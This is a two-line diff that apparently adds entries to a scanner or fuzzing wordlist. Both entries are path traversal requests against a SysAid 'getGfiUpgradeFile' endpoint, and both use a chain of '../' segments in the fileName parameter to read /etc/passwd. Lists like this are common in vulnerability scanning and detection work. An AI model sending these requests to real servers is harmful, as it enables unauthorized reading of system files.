@@ -1,0 +1,2 @@
+/sysaid/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd
+/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd
